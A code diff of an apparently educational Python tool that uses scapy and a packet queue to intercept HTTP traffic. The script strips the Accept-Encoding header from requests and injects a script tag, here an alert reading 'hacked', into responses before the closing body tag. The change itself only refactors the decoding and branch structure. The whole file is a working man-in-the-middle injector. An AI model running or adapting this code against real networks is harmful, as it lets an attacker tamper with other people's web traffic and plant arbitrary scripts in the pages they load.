@@ -16,7 +16,11 @@ def set_load(packet, load):
 def decode_bytes(bytes_to_decode):
     encoding_type = chardet.detect(bytes_to_decode)["encoding"]
     if encoding_type:
-        return bytes_to_decode.decode(encoding_type)
+        try:
+            return bytes_to_decode.decode(encoding_type)
+        except:
+            return False
+
     return False
 
 
@@ -24,37 +28,35 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
     if scapy_packet.haslayer(scapy.Raw):
-        # if destination port == 80 (http port), it is a request
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request")
+        decoded_load_str = decode_bytes(scapy_packet[scapy.Raw].load)
 
-            decoded_load_str = decode_bytes(scapy_packet[scapy.Raw].load)
+        if decoded_load_str:
+            # if destination port == 80 (http port), it is a request
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+] Request")
 
-            if decoded_load_str:
                 # remove Accept-Encoding field
-                modified_load = re.sub(
+                decoded_load_str = re.sub(
                     "Accept-Encoding:.*?\\r\\n",
                     "",
                     decoded_load_str,
                 )
-                new_packet = set_load(scapy_packet, modified_load)
+                new_packet = set_load(scapy_packet, decoded_load_str)
                 print(new_packet.show())
                 packet.set_payload(new_packet.build())
                 # packet.set_payload(bytes(new_packet))
 
-        # if source port == 80 (http port), it is a response
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Response")
+            # if source port == 80 (http port), it is a response
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+] Response")
 
-            str_response = decode_bytes(scapy_packet[scapy.Raw].load)
-
-            if str_response and str_response.find("</body>") > -1:
-                modified_load = str_response.replace(
-                    "</body>", "<script>alert('hacked')</script></body>"
-                )
-                new_packet = set_load(scapy_packet, modified_load)
-                print(new_packet.show())
-                packet.set_payload(new_packet.build())
+                if decoded_load_str.find("</body>") > -1:
+                    decoded_load_str = decoded_load_str.replace(
+                        "</body>", "<script>alert('hacked')</script></body>"
+                    )
+                    new_packet = set_load(scapy_packet, decoded_load_str)
+                    print(new_packet.show())
+                    packet.set_payload(new_packet.build())
 
     packet.accept()
 
